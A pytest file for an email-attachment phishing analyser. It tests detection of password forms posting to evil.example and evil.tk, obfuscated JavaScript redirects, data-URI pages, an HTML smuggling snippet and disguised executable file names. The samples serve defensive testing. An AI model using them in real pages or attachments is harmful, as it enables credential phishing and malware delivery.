"""Bypasses through attachments: HTML and SVG pages, web archives, scripts,
calendar invites, archives and file names."""

from __future__ import annotations

import base64
import io
import re
import zipfile
from pathlib import Path

import pytest
from bs4 import BeautifulSoup

import archive_analysis as arch
import attachment_analysis as aa
import office_analysis as oa
from tests.conftest import shared_cases


def _zip(*names: str) -> bytes:

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name in names:
            zf.writestr(name, "MZ" if name.endswith(".exe") else "")
    return buf.getvalue()


_FILE_NAMES = shared_cases("file_name_cases.json")


def _js_constant(name: str) -> set[str]:

    src = (Path(__file__).resolve().parents[2] / "extension" / "lib" / "constants.js").read_text()
    start = src.index(f"const {name} = ")
    block = src[start : src.index(";", start)]
    words = " ".join(re.findall(r'"([^"]*)"', block))
    return set(words.split())


def test_html_attachment_reports_targets_first():
    html = (
        "".join(f'<img src="https://cdn.example/{i}.png" hidden>' for i in range(300))
        + '<meta http-equiv="refresh" content="0; url=//evil.example/a">'
        + '<form action="https://evil.example/post"><input type="password"></form>'
    )
    out = aa.analyse_html(html.encode(), "invoice.html")
    urls = out["extracted_urls"]
    assert urls[0] == "https://evil.example/post"
    assert "https://evil.example/a" in urls


@pytest.mark.parametrize(
    "html",
    ['<img src=x onerror="go()">', '<a href=" javascript:go()">x</a>', "<body onfocus=go()>"],
)
def test_any_script_counts_as_javascript(html):
    assert "contains_javascript" in aa.analyse_html(html.encode(), "a.html")["notable_features"]


def test_a_page_inside_an_iframe_srcdoc_is_read():
    html = (
        '<iframe srcdoc="<form action=&quot;https://evil.example/login&quot;>'
        '<input type=password></form><script>go()</script>"></iframe>'
    )
    out = aa.analyse_html(html.encode(), "a.html")
    assert out["extracted_urls"] == ["https://evil.example/login"]
    assert {"contains_form", "contains_password_field", "contains_javascript"} <= set(
        out["notable_features"]
    )


@pytest.mark.parametrize(
    "html",
    [
        '<form><button formaction="https://evil.example/login">Sign in</button></form>',
        '<iframe src="data:text/html;base64,'
        + base64.b64encode(b'<form action="https://evil.example/login"></form>').decode()
        + '"></iframe>',
        '<meta http-equiv="refresh" content="0;url=data:text/html,'
        '%3Cform%20action%3D%22https%3A%2F%2Fevil.example%2Flogin%22%3E%3C%2Fform%3E">',
        '<object data="data:text/html,%3Ca%20href%3D%22https%3A%2F%2Fevil.example%2Flogin%22%3Ex%3C%2Fa%3E"></object>',
    ],
)
def test_html_attachment_formaction_and_data_pages(html):
    assert (
        "https://evil.example/login" in aa.analyse_html(html.encode(), "a.html")["extracted_urls"]
    )


@pytest.mark.parametrize(
    "src",
    [
        "data:text/html,<form action='https://evil.example/login'><input type='password'></form>",
        "data:text/html;charset=utf-8;base64,"
        + base64.b64encode(b"<form action='https://evil.example/login'></form>").decode(),
        "data:application/xhtml+xml;base64,"
        + base64.b64encode(b"<form action='https://evil.example/login'></form>").decode(),
    ],
)
def test_data_pages_with_spaces_or_parameters_are_read(src):
    out = aa.analyse_html(f'<iframe src="{src}"></iframe>'.encode(), "a.html")
    assert "https://evil.example/login" in out["extracted_urls"]
    assert "contains_form" in out["notable_features"]


@pytest.mark.parametrize(
    "name", ["invoice.exe ", "invoice.exe.", "invoice‮fdp.exe", "ｉｎｖ.ＥＸＥ"]
)
def test_file_names_windows_would_run(name):
    assert "executable_in_archive" in arch.classify_names([name])


def test_direction_override_is_fake_extension():
    assert "double_extension" in arch.classify_names(["invoice‮exe.pdf"])


@pytest.mark.parametrize("name", ["invoice.pdf.exe.", "invoice.pdf.exe ", "invoice.pdf.ｅｘｅ"])
def test_fake_extension_final_dot_or_full_width(name):
    assert "double_extension" in arch.classify_names([name])


def test_attachment_texts_find_addresses_like_emails():
    assert aa.extract_urls("see www.evil.tk/login and HTTP://192.168.1.1/x") == [
        "http://www.evil.tk/login",
        "http://192.168.1.1/x",
    ]
    found: list[str] = []
    oa._urls_from("open WWW.evil.tk/doc", found)
    assert found == ["http://www.evil.tk/doc"]


@pytest.mark.parametrize("value", ["PASSWORD", "Password", " password "])
def test_a_password_field_in_any_case(value):
    html = f'<form action="https://attacker.example/post"><input type="{value}" name="p"></form>'
    assert (
        "contains_password_field"
        in aa.analyse_html(html.encode(), "invoice.html")["notable_features"]
    )


@pytest.mark.parametrize("filename", ["docs.zip", "report.docx"])
def test_archive_named_as_word_file_shows_program(filename):
    raw = _zip("[Content_Types].xml", "word/x", "invoice.pdf.exe")
    out = aa.analyse_attachment(base64.b64encode(raw).decode(), filename=filename)
    assert "executable_in_archive" in out["notable_features"]


def test_a_real_word_file_is_still_read_as_one():
    raw = _zip("[Content_Types].xml", "word/document.xml", "word/media/image1.png")
    out = aa.analyse_attachment(base64.b64encode(raw).decode(), filename="report.docx")
    assert out["kind"] == "docx"
    assert out["notable_features"] == []


@pytest.mark.parametrize(
    ("content", "target"),
    [
        ("0; url=https://evil.tk/a", "https://evil.tk/a"),
        ("0; https://evil.tk/b", "https://evil.tk/b"),
        ("0,URL = 'https://evil.tk/c'", "https://evil.tk/c"),
        ("5", ""),
    ],
)
def test_meta_refresh_targets(content, target):
    meta = BeautifulSoup(f'<meta http-equiv="refresh" content="{content}">', "html.parser").meta
    assert aa._refresh_target(meta) == target


def test_a_percent_encoded_base64_page_is_read():
    page = base64.b64encode(b"<form action='https://evil.example/login'></form>???").decode()
    encoded = page.replace("+", "%2B").replace("=", "%3D").replace("/", "%2F")
    out = aa.analyse_html(
        f'<iframe src="data:text/html;base64,{encoded}"></iframe>'.encode(), "a.html"
    )
    assert "https://evil.example/login" in out["extracted_urls"]


def test_an_svg_attachment_is_read_as_a_page():
    svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">'
        b'<a xlink:href="https://evil.tk/login"><text>Open</text></a>'
        b"<script>location='https://evil.tk/x'</script></svg>"
    )
    out = aa.analyse_attachment(base64.b64encode(svg).decode(), filename="invoice.svg")
    assert "https://evil.tk/login" in out["extracted_urls"]
    assert "contains_javascript" in out["notable_features"]


@pytest.mark.parametrize(
    "html",
    [
        '<object data="javascript:go()"></object>',
        '<a href=" &#10;java&#9;script:go()">x</a>',
        '<iframe src="data:text/&#10;html;base64,PGZvcm0+PC9mb3JtPg=="></iframe>',
    ],
)
def test_script_addresses_in_any_attribute(html):
    out = aa.analyse_html(html.encode(), "a.html")
    assert {"contains_javascript", "contains_form"} & set(out["notable_features"])


def test_invisible_padding_keeps_attachment_text():
    text = ("\u200b" * 30_000 + "Verify your account at https://evil.tk/login").encode()
    out = aa.analyse_attachment(base64.b64encode(text).decode(), filename="note.txt")
    assert "Verify your account" in out["extracted_text"]
    assert "https://evil.tk/login" in out["extracted_urls"]


def test_calendar_links_from_every_property():
    ics = (
        b"BEGIN:VCALENDAR\r\nBEGIN:VEVENT\r\nSUMMARY:Review\r\n"
        b"CONFERENCE;VALUE=URI:https://evil.tk/meet\r\n"
        b'X-ALT-DESC;FMTTYPE=text/html:<a href="https://evil.tk/doc">Open</a>\r\n'
        b"END:VEVENT\r\nEND:VCALENDAR\r\n"
    )
    out = aa.analyse_attachment(base64.b64encode(ics).decode(), filename="invite.ics")
    assert {"https://evil.tk/meet", "https://evil.tk/doc"} <= set(out["extracted_urls"])


@pytest.mark.parametrize("case", _FILE_NAMES["names"], ids=lambda c: repr(c["name"]))
def test_file_extensions_shared_with_the_extension(case):
    assert arch._ext(case["name"]) == case["ext"]


@pytest.mark.parametrize(
    "name",
    [
        "invoice.pdf.exe\u200b",
        "invoice\u202efdp.exe\u202c",
        "invoice.pdf\u200b.exe",
        "invoice.exe\x00",
    ],
)
def test_invisible_characters_do_not_hide_a_program(name):
    assert "executable_in_archive" in arch.classify_names([name])


def test_extension_knows_server_dangerous_types():
    server = arch.EXECUTABLE_EXTS | arch.SCRIPT_EXTS | arch.SHORTCUT_EXTS | arch.DISK_IMAGE_EXTS
    assert _js_constant("DANGEROUS_EXTS") == server


def test_server_reads_every_extension_type():
    readable = {e.lstrip(".") for e in aa._MIME_BY_EXT} | arch.ARCHIVE_EXTS
    assert _js_constant("ATTACHMENT_EXTS") <= readable


@pytest.mark.parametrize(
    ("html", "url"),
    [
        (
            '<base href="https://evil.tk/"><form action="login.php"></form>',
            "https://evil.tk/login.php",
        ),
        ('<script>location="\\x68\\x74\\x74\\x70\\x73://evil.tk/a"</script>', "https://evil.tk/a"),
        (
            "<script>location=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,116,107)</script>",
            "https://evil.tk",
        ),
        ('<script>location=atob("aHR0cHM6Ly9ldmlsLnRrL2Jsb2I=")</script>', "https://evil.tk/blob"),
        (
            '<script>location=unescape("%68%74%74%70%73%3a%2f%2fevil.tk%2fu")</script>',
            "https://evil.tk/u",
        ),
    ],
)
def test_page_addresses_as_the_browser_builds_them(html, url):
    assert url in aa.analyse_html(html.encode(), "a.html")["extracted_urls"]


def test_html_smuggling_is_flagged():
    page = b'<script>var b=new Blob([d]);var a=document.createElement("a");a.href=URL.createObjectURL(b);a.download="x.iso";a.click()</script>'
    assert "embeds_another_file" in aa.analyse_html(page, "a.html")["notable_features"]


def test_a_web_archive_is_read_as_a_page():
    mht = (
        b'MIME-Version: 1.0\r\nContent-Type: multipart/related; boundary="b"\r\n\r\n--b\r\n'
        b"Content-Type: text/html\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n"
        b'<form action=3D"https://evil.tk/p"><input type=3Dpassword></form>\r\n--b--\r\n'
    )
    out = aa.analyse_attachment(base64.b64encode(mht).decode(), filename="page.mht")
    assert "contains_password_field" in out["notable_features"]
    assert "https://evil.tk/p" in out["extracted_urls"]


@pytest.mark.parametrize(
    ("html", "url"),
    [
        (
            "<script>location=String.fromCharCode(0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,"
            "0x65,0x76,0x69,0x6c,0x2e,0x74,0x6b)</script>",
            "https://evil.tk",
        ),
        ("<script>location=\"https://ev\" + 'il.tk/login'</script>", "https://evil.tk/login"),
        (
            '<script>location="nigol/kt.live//:sptth".split("").reverse().join("")</script>',
            "https://evil.tk/login",
        ),
        ('<script>location=atob("aHR0cHM6Ly9l"+"dmlsLnRr")</script>', "https://evil.tk"),
    ],
)
def test_script_addresses_built_in_pieces(html, url):
    urls = aa.analyse_html(html.encode(), "a.html")["extracted_urls"]
    assert url in urls
    assert "https://ev" not in urls


def test_web_archive_relative_targets_use_location():
    mht = (
        b'MIME-Version: 1.0\r\nContent-Type: multipart/related; boundary="b"\r\n\r\n--b\r\n'
        b"Content-Type: application/xhtml+xml\r\nContent-Location: https://evil.tk/dir/index.html\r\n\r\n"
        b'<form action="login.php"><input type="password"/></form>\r\n--b--\r\n'
    )
    out = aa.analyse_attachment(base64.b64encode(mht).decode(), filename="page.mht")
    assert "https://evil.tk/dir/login.php" in out["extracted_urls"]


def test_a_page_written_by_a_script_is_read():
    page = base64.b64encode(
        b'<form action="https://evil.tk/login"><input type="password"></form>'
    ).decode()
    out = aa.analyse_html(f'<script>document.write(atob("{page}"))</script>'.encode(), "a.html")
    assert {"contains_form", "contains_password_field"} <= set(out["notable_features"])
    plain = aa.analyse_html(b"<script>if (a < b) { go() }</script><p>Hello</p>", "a.html")
    assert plain["extracted_text"] == "Hello"


def test_web_archive_pictures_read_programs_named():
    def mht(name, ctype):
        return (
            b'MIME-Version: 1.0\r\nContent-Type: multipart/related; boundary="b"\r\n\r\n--b\r\n'
            b"Content-Type: text/html\r\n\r\n<p>Hello</p>\r\n--b\r\n"
            + f'Content-Type: {ctype}\r\nContent-Disposition: attachment; filename="{name}"\r\n'.encode()
            + b"Content-Transfer-Encoding: base64\r\n\r\nTVo=\r\n--b--\r\n"
        )

    pic = aa.analyse_attachment(
        base64.b64encode(mht("logo.png", "image/png")).decode(), filename="p.mht"
    )
    assert pic["notable_features"] == []
    exe = aa.analyse_attachment(
        base64.b64encode(mht("invoice.pdf.exe", "application/octet-stream")).decode(),
        filename="p.mht",
    )
    assert {"executable_in_archive", "double_extension"} <= set(exe["notable_features"])


@pytest.mark.parametrize(
    "script",
    [
        "var icon = '<img src=\"x.png\">'; function calc(x) { if (x > 0) return x; }",
        "var s = \"<a href='x'>link</a>\"; if (a > b) { go(); }",
    ],
)
def test_script_code_is_not_page_text(script):
    # Markup in a literal may be written into the page (it is read as the
    # page's); the code around it never is.
    out = aa.analyse_html(f"<script>{script}</script><p>Hello</p>".encode(), "a.html")
    assert "Hello" in out["extracted_text"]
    assert not any(w in out["extracted_text"] for w in ("function", "if (", "go()", "return"))


def test_every_page_a_script_writes_is_read():
    page = base64.b64encode(
        b'<form action="https://evil.tk/login"><input type="password"></form>'
    ).decode()
    out = aa.analyse_html(
        f'<script>var d="<img>";document.write(atob("{page}"))</script>'.encode(), "a.html"
    )
    assert {"contains_form", "contains_password_field"} <= set(out["notable_features"])


def test_encoded_attachment_names_in_a_web_archive():
    mht = (
        b'MIME-Version: 1.0\r\nContent-Type: multipart/related; boundary="b"\r\n\r\n--b\r\n'
        b"Content-Type: text/html\r\n\r\n<p>Hello</p>\r\n--b\r\nContent-Type: application/octet-stream\r\n"
        b'Content-Disposition: attachment; filename="=?utf-8?b?aW52b2ljZS5wZGYuZXhl?="\r\n'
        b"Content-Transfer-Encoding: base64\r\n\r\nTVo=\r\n--b--\r\n"
    )
    out = aa.analyse_attachment(base64.b64encode(mht).decode(), filename="p.mht")
    assert {"executable_in_archive", "double_extension"} <= set(out["notable_features"])


def test_percent_and_comments_in_code_not_page_text():
    script = 'var w="100%"; var i="<img src=x>"; // don\'t\nfunction f(x){if(x>0)return x%2;}'
    assert (
        aa.analyse_html(f"<script>{script}</script><p>Hello</p>".encode(), "a.html")[
            "extracted_text"
        ]
        == "Hello"
    )
    written = '<script>document.write(unescape("%3Cform%20action%3D%22https%3A//evil.tk/p%22%3E%3Cinput%20type%3Dpassword%3E"))</script>'
    assert (
        "contains_password_field" in aa.analyse_html(written.encode(), "a.html")["notable_features"]
    )
